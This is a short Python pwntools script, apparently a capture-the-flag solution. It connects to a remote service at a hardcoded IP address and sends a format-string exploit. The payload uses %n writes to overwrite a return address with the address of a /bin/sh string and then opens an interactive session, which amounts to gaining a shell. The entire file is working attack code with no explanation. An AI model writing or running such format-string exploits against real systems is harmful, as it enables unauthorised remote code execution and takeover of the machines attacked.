#!/usr/bin/env python

from pwn import *
import re

ret_addr = 0xffffda9c

addr_bin_sh = ret_addr + 0x8

def debug_format_attack(r):
    l = re.findall(r"\[(.+)\]", r, re.MULTILINE)

    print "[+] Debug: "
    print l

p = remote("35.237.220.217", 1339)

buf = p32(ret_addr)
buf += p32(ret_addr + 1)
buf += p32(ret_addr + 2)
buf += p32(ret_addr + 3)
buf += p32(addr_bin_sh)
buf += p32(addr_bin_sh + 1)
buf += p32(addr_bin_sh + 2)
buf += p32(addr_bin_sh + 3)

buf += "a" * 104
buf += "%64x"
buf += "%18$n"
buf += "%249x"
buf += "%19$n"
buf += "%172x"
buf += "%20$n"
buf += "%18x"
buf += "%21$n"
# buf += "N: [%18$s]"

# buf += "[$22$s]"
buf += "%52x"
buf += "%22$n"
buf += "%245x"
buf += "%23$n"
buf += "%215x"
buf += "%24$n"
buf += "%25$n"
buf += "S: [%22$s]"

p.sendline(buf)

r = p.recvrepeat(3.0)
print "[+] Response: " + r
debug_format_attack(r)

p.interactive()
